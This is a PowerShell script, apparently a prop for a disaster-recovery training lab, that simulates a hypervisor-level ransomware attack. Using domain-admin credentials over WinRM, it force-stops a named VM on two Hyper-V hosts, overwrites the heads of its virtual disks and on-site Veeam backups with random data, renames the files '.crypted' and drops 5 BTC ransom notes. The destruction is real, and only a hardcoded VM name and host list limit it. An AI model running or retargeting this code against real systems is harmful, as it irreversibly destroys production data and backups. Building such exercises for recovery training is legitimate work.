#Requires -Version 5.1
<#
    Simulate-Attack.ps1 — CADMUS CR09 Lab D1 ransomware simulation (orchestrator).

    SAFE, SELF-CONTAINED lab prop. It uses no real cipher and does not spread. It
    reproduces the *observable* effect of a modern hypervisor-level ransomware
    intrusion (Akira / Play / ESXiArgs class): the attacker holds stolen
    domain-admin credentials and, from a single foothold, reaches across the estate
    to attack the virtual-disk files in each datastore directly — bypassing any
    in-guest protection — and to encrypt the on-site backups.

    Run it ONCE, as a domain administrator, from the BCKUP1 console. From there it:
      SRV02  (over WinRM) — LIN01 is running here (production, post-B1 failover):
                           the VM is stopped and its disk head is overwritten.
      SRV01  (over WinRM) — LIN01's replica lives here (off): its disk is overwritten.
      BCKUP1 (local)      — the on-site LIN01 backup files are encrypted in place.

    The offsite immutable copy on BCKUP2 is deliberately never touched — that is the
    copy Lab D1 restores from.

    If you are not logged in as a domain admin, pass -Credential (Get-Credential for
    drlab\domainuser) so the remote calls to SRV01/SRV02 can authenticate.
#>
param(
    [string[]]$HypervHosts = @('SRV02', 'SRV01'),
    # On-site backup roots to search (recursively) for LIN01's backup files. Veeam
    # stores them under a per-job subfolder, so this is searched deep, and only files
    # whose name contains LIN01 are touched — DC01's backups are left alone.
    [string[]]$BackupRoots = @('C:\backup', 'C:\Backups', 'C:\Installs\Backups'),
    [System.Management.Automation.PSCredential]$Credential
)
$ErrorActionPreference = 'Stop'

$note = @'
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
YOUR VIRTUAL MACHINES AND BACKUPS HAVE BEEN ENCRYPTED.

Your Hyper-V virtual disks and backup files are locked. Replicas
and on-site backups are gone too. To receive the decryption key,
pay 5 BTC within 72 hours.

Contact: decrypt@ransomware.example
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'@

# Overwrite the first N MB of a file with random data, in place, then rename it with
# a .crypted extension. Corrupting the head (GPT/boot/superblock for a disk, the
# header for a .vbk) destroys the file even if someone renames it back — so the only
# real recovery path is the offsite backup, which is the whole point of Lab D1.
# Defined as a string so it can be injected into the remote session unchanged.
$corruptFn = @'
function Invoke-Corrupt([string]$Path, [int]$MegaBytes, [string]$Note) {
    $bytes = $MegaBytes * 1MB
    $len = (Get-Item -LiteralPath $Path).Length
    if ($len -lt $bytes) { $bytes = [int]$len }
    $buf = New-Object byte[] $bytes
    (New-Object System.Random).NextBytes($buf)

    # A VM that has just been turned off can keep its VHDX locked for a few seconds
    # while the worker process exits, so retry the exclusive open for up to ~40s
    # before giving up.
    $fs = $null
    $lastErr = $null
    for ($i = 0; $i -lt 20 -and -not $fs; $i++) {
        try {
            $fs = [System.IO.File]::Open($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::None)
        } catch { $lastErr = $_; Start-Sleep -Seconds 2 }
    }
    if (-not $fs) { throw "still locked after ~40s ($lastErr)" }
    try {
        $fs.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
        $fs.Write($buf, 0, $buf.Length)
        $fs.Flush()
    } finally { $fs.Dispose() }

    Rename-Item -LiteralPath $Path -NewName ((Split-Path $Path -Leaf) + '.crypted') -Force

    if ($Note) {
        $t = Join-Path (Split-Path $Path -Parent) '!!!_READ_ME_!!!.txt'
        Set-Content -LiteralPath $t -Value $Note -Encoding ASCII
    }
}
'@

# Runs ON a Hyper-V host: stop LIN01, wait for it to actually reach Off, then
# overwrite its virtual disk(s). Returns a result object per disk so partial
# failures are visible in the orchestrator's summary rather than swallowed.
$attackVm = {
    param($CorruptFn, $Note)
    . ([scriptblock]::Create($CorruptFn))
    $out = @()
    $vm = Get-VM -Name 'LIN01' -ErrorAction SilentlyContinue
    if (-not $vm) {
        return [pscustomobject]@{ Host = $env:COMPUTERNAME; Target = 'LIN01 (VM)'; Status = 'SKIP'; Detail = 'no LIN01 VM on this host' }
    }

    # Stop hard and confirm Off — the file stays locked until the VM is really down,
    # which is the usual reason a first attempt leaves the disk untouched.
    if ($vm.State -ne 'Off') {
        Stop-VM -Name 'LIN01' -TurnOff -Force -ErrorAction SilentlyContinue
        for ($i = 0; $i -lt 30 -and (Get-VM -Name 'LIN01').State -ne 'Off'; $i++) { Start-Sleep -Seconds 1 }
    }
    $state = (Get-VM -Name 'LIN01').State

    $disks = Get-VMHardDiskDrive -VMName 'LIN01'
    if (-not $disks) {
        return [pscustomobject]@{ Host = $env:COMPUTERNAME; Target = 'LIN01 (VM)'; Status = 'FAILED'; Detail = 'no virtual disks attached' }
    }
    foreach ($d in $disks) {
        if (-not ($d.Path -and (Test-Path -LiteralPath $d.Path))) {
            if ($d.Path -and (Test-Path -LiteralPath "$($d.Path).crypted")) {
                $out += [pscustomobject]@{ Host = $env:COMPUTERNAME; Target = "$($d.Path).crypted"; Status = 'ALREADY'; Detail = 'encrypted by a prior run' }
            } else {
                $out += [pscustomobject]@{ Host = $env:COMPUTERNAME; Target = $d.Path; Status = 'SKIP'; Detail = 'path missing' }
            }
            continue
        }
        try {
            Invoke-Corrupt -Path $d.Path -MegaBytes 10 -Note $Note
            $out += [pscustomobject]@{ Host = $env:COMPUTERNAME; Target = "$($d.Path).crypted"; Status = 'ENCRYPTED'; Detail = "VM state was $state" }
        } catch {
            $out += [pscustomobject]@{ Host = $env:COMPUTERNAME; Target = $d.Path; Status = 'FAILED'; Detail = "$_" }
        }
    }
    return $out
}

Write-Host '=== CR09 Lab D1 ransomware simulation — detonating across the estate ===' -ForegroundColor Yellow
$results = @()

# --- Hypervisors: production VM on SRV02, replica on SRV01 ---
foreach ($h in $HypervHosts) {
    Write-Host "[*] Reaching $h over WinRM ..."
    $icArgs = @{ ComputerName = $h; ScriptBlock = $attackVm; ArgumentList = @($corruptFn, $note) }
    if ($Credential) { $icArgs.Credential = $Credential }
    try {
        $results += Invoke-Command @icArgs
    } catch {
        $results += [pscustomobject]@{ Host = $h; Target = 'LIN01 (VM)'; Status = 'FAILED'; Detail = "WinRM/remote error: $_" }
    }
}

# --- On-site backups: encrypt LIN01's backup files here on BCKUP1 ---
# Veeam keeps each job in its own subfolder (e.g. "C:\Backup\Backup LIN01 - Primary"),
# so search the roots recursively and touch only files whose name contains LIN01 —
# DC01's on-site backup in the same repository is deliberately left intact.
. ([scriptblock]::Create($corruptFn))
$vbk = @()
foreach ($root in $BackupRoots) {
    if (Test-Path $root) {
        $vbk += Get-ChildItem -Path $root -Recurse -File -ErrorAction SilentlyContinue |
            Where-Object { $_.Extension -in '.vbk', '.vib', '.vbm' -and $_.BaseName -like '*LIN01*' }
    }
}
$vbk = $vbk | Sort-Object FullName -Unique
if ($vbk) {
    foreach ($f in $vbk) {
        try {
            Invoke-Corrupt -Path $f.FullName -MegaBytes 1
            $results += [pscustomobject]@{ Host = $env:COMPUTERNAME; Target = "$($f.FullName).crypted"; Status = 'ENCRYPTED'; Detail = 'on-site backup' }
        } catch {
            $results += [pscustomobject]@{ Host = $env:COMPUTERNAME; Target = $f.FullName; Status = 'FAILED'; Detail = "$_" }
        }
    }
    foreach ($dir in ($vbk | Select-Object -ExpandProperty DirectoryName -Unique)) {
        Set-Content -LiteralPath (Join-Path $dir '!!!_READ_ME_!!!.txt') -Value $note -Encoding ASCII
    }
} else {
    # Nothing to encrypt: distinguish "already .crypted from a prior run" from "not found".
    $crypted = @()
    foreach ($root in $BackupRoots) {
        if (Test-Path $root) {
            $crypted += Get-ChildItem -Path $root -Recurse -File -ErrorAction SilentlyContinue |
                Where-Object { $_.Extension -eq '.crypted' -and $_.Name -like '*LIN01*' }
        }
    }
    if ($crypted) {
        $results += [pscustomobject]@{ Host = $env:COMPUTERNAME; Target = ($crypted | Select-Object -First 1 -ExpandProperty DirectoryName); Status = 'ALREADY'; Detail = "$($crypted.Count) LIN01 backup file(s) already .crypted" }
    } else {
        $results += [pscustomobject]@{ Host = $env:COMPUTERNAME; Target = ($BackupRoots -join '; '); Status = 'SKIP'; Detail = 'no LIN01 backup files found in on-site roots' }
    }
}

# --- Summary: make any failure impossible to miss ---
Write-Host ''
Write-Host '=== Result ===' -ForegroundColor Yellow
$results | Format-Table Host, Status, Target, Detail -AutoSize | Out-String | Write-Host

$failed  = @($results | Where-Object Status -eq 'FAILED')
$hit     = @($results | Where-Object Status -eq 'ENCRYPTED')
$already = @($results | Where-Object Status -eq 'ALREADY')
if ($failed.Count) {
    Write-Host "[!] $($failed.Count) target(s) NOT encrypted — see FAILED rows above and re-run after fixing (VM not Off, or WinRM to the host closed)." -ForegroundColor Red
} elseif ($hit.Count) {
    Write-Host "[+] Done. $($hit.Count) target(s) encrypted; BCKUP2 left untouched." -ForegroundColor Green
    if ($already.Count) { Write-Host "    ($($already.Count) target(s) were already encrypted by a prior run.)" -ForegroundColor DarkGray }
} elseif ($already.Count) {
    Write-Host '[=] Attack already simulated. Every target is in the encrypted state from a previous run — nothing to do.' -ForegroundColor Yellow
} else {
    Write-Host '[!] Nothing was encrypted. Check that LIN01 exists on SRV01/SRV02 and the backup exists on BCKUP1.' -ForegroundColor Red
}
